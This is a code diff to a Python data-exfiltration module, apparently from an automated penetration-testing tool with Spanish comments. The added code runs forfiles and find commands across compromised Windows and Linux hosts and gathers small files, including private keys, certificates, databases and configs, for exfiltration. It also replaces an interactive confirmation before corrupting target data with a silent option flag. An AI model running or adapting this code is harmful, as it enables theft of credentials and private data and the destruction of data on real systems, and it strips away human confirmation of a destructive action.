@@ -223,6 +223,118 @@ class ExfiltrationModule:
         self.logger.info(f"✅ FASE 1 COMPLETADA: {len(collected_data)} conjuntos de datos recopilados de {total_systems} sistemas")
         return collected_data
     
+    def collect_small_files_only(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Recopilar solo archivos pequeños (exfiltración rápida)"""
+        self.logging_system.log_progress("RECOPILANDO ARCHIVOS PEQUEÑOS (EXFILTRACIÓN RÁPIDA)", "EXFILTRATION")
+        
+        collected_data = []
+        max_file_size = 10 * 1024 * 1024  # 10MB máximo por archivo
+        total_size_limit = 100 * 1024 * 1024  # 100MB total máximo
+        
+        # Extensiones de archivos pequeños a excluir (fotos, videos, etc.)
+        excluded_extensions = {
+            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp',  # Imágenes
+            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',     # Videos
+            '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma',             # Audio
+            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',                # Archivos comprimidos
+            '.iso', '.img', '.bin', '.exe', '.msi', '.dmg'               # Archivos grandes
+        }
+        
+        # Extensiones de archivos pequeños a incluir
+        included_extensions = {
+            '.txt', '.log', '.cfg', '.ini', '.conf', '.xml', '.json',    # Configuración
+            '.doc', '.docx', '.pdf', '.rtf',                             # Documentos pequeños
+            '.csv', '.xls', '.xlsx',                                     # Datos
+            '.sql', '.db', '.sqlite',                                    # Bases de datos pequeñas
+            '.key', '.pem', '.crt', '.p12', '.pfx',                      # Certificados
+            '.bat', '.sh', '.ps1', '.py', '.js', '.php',                 # Scripts
+            '.bak', '.old', '.tmp'                                       # Archivos temporales
+        }
+        
+        for system in compromised_systems:
+            host = system['host']
+            self.logging_system.log_info(f"Recopilando archivos pequeños en {host}", "EXFILTRATION")
+            
+            # Comandos para encontrar archivos pequeños
+            find_commands = [
+                # Windows
+                f'forfiles /p C:\\ /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
+                f'forfiles /p C:\\Users /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
+                f'forfiles /p C:\\Windows\\System32 /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
+                
+                # Linux
+                f'find /home -type f -size -10M -name "*.txt" -o -name "*.log" -o -name "*.cfg" -o -name "*.conf" 2>/dev/null',
+                f'find /etc -type f -size -10M -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null',
+                f'find /var/log -type f -size -10M -name "*.log" 2>/dev/null'
+            ]
+            
+            for command in find_commands:
+                result = self._run_command(command.split(), timeout=60)
+                
+                if result['success'] and result['stdout']:
+                    files = result['stdout'].strip().split('\n')
+                    
+                    for file_path in files:
+                        if not file_path.strip():
+                            continue
+                        
+                        file_path = file_path.strip()
+                        file_ext = Path(file_path).suffix.lower()
+                        
+                        # Verificar extensión
+                        if file_ext in excluded_extensions:
+                            continue
+                        
+                        if file_ext not in included_extensions and file_ext != '':
+                            continue
+                        
+                        # Verificar tamaño del archivo
+                        try:
+                            file_size = self._get_file_size(file_path)
+                            if file_size > max_file_size:
+                                continue
+                            
+                            # Verificar límite total
+                            if sum(data.get('size', 0) for data in collected_data) + file_size > total_size_limit:
+                                self.logging_system.log_warning(f"Límite total de tamaño alcanzado ({total_size_limit} bytes)", "EXFILTRATION")
+                                break
+                            
+                            # Agregar archivo a la lista
+                            collected_data.append({
+                                'file_path': file_path,
+                                'host': host,
+                                'size': file_size,
+                                'type': 'small_file',
+                                'extension': file_ext,
+                                'timestamp': time.time()
+                            })
+                            
+                            self.logging_system.log_info(f"Archivo pequeño encontrado: {file_path} ({file_size} bytes)", "EXFILTRATION")
+                            
+                        except Exception as e:
+                            self.logging_system.log_debug(f"Error verificando archivo {file_path}: {e}", "EXFILTRATION")
+                            continue
+        
+        self.logging_system.log_success(f"EXFILTRACIÓN RÁPIDA COMPLETADA: {len(collected_data)} archivos pequeños recopilados", "EXFILTRATION")
+        return collected_data
+    
+    def _get_file_size(self, file_path: str) -> int:
+        """Obtener tamaño de archivo"""
+        try:
+            # Comando para obtener tamaño de archivo
+            if os.name == 'nt':  # Windows
+                command = f'forfiles /p "{os.path.dirname(file_path)}" /m "{os.path.basename(file_path)}" /c "cmd /c echo @fsize"'
+            else:  # Linux
+                command = f'stat -c%s "{file_path}"'
+            
+            result = self._run_command(command.split(), timeout=10)
+            if result['success'] and result['stdout']:
+                return int(result['stdout'].strip())
+        except:
+            pass
+        
+        return 0
+    
     def _collect_user_data(self, host: str) -> Optional[Dict[str, Any]]:
         """Recopilar datos de usuario"""
         try:
@@ -765,12 +877,27 @@ class ExfiltrationModule:
         return cleanup_results
     
     
-    def run(self, management_mode: bool = False, log_file: str = "pentest_automation.log") -> Dict[str, Any]:
+    def run(self, management_mode: bool = False, log_file: str = "pentest_automation.log", delicate_options: Dict[str, Any] = None) -> Dict[str, Any]:
         """Ejecutar módulo completo de exfiltración"""
         self.logging_system.log_progress("INICIANDO MÓDULO DE EXFILTRACIÓN DE DATOS", "EXFILTRATION")
         self.logging_system.log_info("=" * 60, "EXFILTRATION")
         
         start_time = time.time()
+        
+        # Configurar opciones delicadas
+        if delicate_options is None:
+            delicate_options = {
+                'compression_enabled': False,
+                'encryption_enabled': False,
+                'corruption_enabled': False,
+                'fast_exfiltration': True
+            }
+        
+        self.logging_system.log_info(f"Configuración de exfiltración:", "EXFILTRATION")
+        self.logging_system.log_info(f"  • Compresión: {'✅ Habilitada' if delicate_options.get('compression_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
+        self.logging_system.log_info(f"  • Encriptación: {'✅ Habilitada' if delicate_options.get('encryption_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
+        self.logging_system.log_info(f"  • Corrupción: {'✅ Habilitada' if delicate_options.get('corruption_enabled') else '❌ Deshabilitada'}", "EXFILTRATION")
+        self.logging_system.log_info(f"  • Exfiltración rápida: {'✅ Habilitada' if delicate_options.get('fast_exfiltration') else '❌ Deshabilitada'}", "EXFILTRATION")
         
         try:
             if management_mode:
@@ -816,7 +943,10 @@ class ExfiltrationModule:
                     self.logging_system.log_info("Asegúrese de que el archivo de log contenga información de exploits", "EXFILTRATION")
                 
             else:
-                self.logger.info("🆕 MODO NORMAL: Ejecutando exfiltración completa")
+                if delicate_options.get('fast_exfiltration', True):
+                    self.logger.info("⚡ MODO RÁPIDO: Ejecutando exfiltración rápida de archivos pequeños")
+                else:
+                    self.logger.info("🆕 MODO COMPLETO: Ejecutando exfiltración completa")
                 
                 # Sistemas comprometidos de ejemplo (en implementación real vendrían de fases anteriores)
                 compromised_systems = [
@@ -829,46 +959,45 @@ class ExfiltrationModule:
                     self.logger.info(f"  📊 {system['host']} - {system['privilege_level']}")
                 
                 # 1. Recopilar datos sensibles
-                collected_data = self.collect_sensitive_data(compromised_systems)
+                if delicate_options.get('fast_exfiltration', True):
+                    # Exfiltración rápida: solo archivos pequeños
+                    collected_data = self.collect_small_files_only(compromised_systems)
+                else:
+                    # Exfiltración completa: todos los archivos
+                    collected_data = self.collect_sensitive_data(compromised_systems)
                 
                 if not collected_data:
                     self.logger.warning("⚠️ No se pudieron recopilar datos - posible falta de acceso o vulnerabilidades")
                     self.logger.info("💡 Verifique que los sistemas estén realmente comprometidos")
                     return self.results
                 
-                # 2. Comprimir datos (con permisos)
-                compression_results = self.compress_data(collected_data)
-                
-                if not compression_results:
-                    self.logging_system.log_warning("Compresión cancelada o falló", "EXFILTRATION")
-                    # Continuar sin compresión
-                    data_files = []
+                # 2. Comprimir datos (solo si está habilitado)
+                compression_results = []
+                if delicate_options.get('compression_enabled', False):
+                    compression_results = self.compress_data(collected_data)
+                    
+                    if not compression_results:
+                        self.logging_system.log_warning("Compresión cancelada o falló", "EXFILTRATION")
+                        data_files = []
+                    else:
+                        data_files = [result['zip_file'] for result in compression_results]
                 else:
-                    data_files = [result['zip_file'] for result in compression_results]
+                    # Sin compresión, usar archivos originales
+                    data_files = [data['file_path'] for data in collected_data]
                 
-                # 2.5. Encriptar datos (opcional, con permisos)
+                # 2.5. Encriptar datos (solo si está habilitado)
                 encryption_results = []
-                if data_files and self.exfiltration_config.get('encryption', False):
+                if data_files and delicate_options.get('encryption_enabled', False):
                     encryption_results = self.encrypt_data(data_files)
                     if encryption_results:
                         data_files = [result['encrypted_file'] for result in encryption_results]
                 
-                # 2.7. Corromper datos (opcional, con permisos críticos)
+                # 2.7. Corromper datos (solo si está habilitado)
                 corruption_results = []
-                if data_files:
-                    # Preguntar si desea corromper datos
-                    self.logging_system.log_info("¿Desea corromper datos del sistema objetivo?", "EXFILTRATION")
-                    print(f"{Colors.YELLOW}1. Sí, corromper datos{Colors.END}")
-                    print(f"{Colors.BLUE}2. No, solo exfiltrar{Colors.END}")
-                    
-                    try:
-                        choice = input(f"{Colors.YELLOW}Seleccione opción (1-2): {Colors.END}")
-                        if choice == '1':
-                            corruption_results = self.corrupt_data(data_files)
-                            if corruption_results:
-                                data_files = [result['corrupted_file'] for result in corruption_results]
-                    except KeyboardInterrupt:
-                        self.logging_system.log_info("Corrupción de datos cancelada", "EXFILTRATION")
+                if data_files and delicate_options.get('corruption_enabled', False):
+                    corruption_results = self.corrupt_data(data_files)
+                    if corruption_results:
+                        data_files = [result['corrupted_file'] for result in corruption_results]
                 
                 # 3. Exfiltrar datos
                 exfiltration_results = self.exfiltrate_data(data_files)
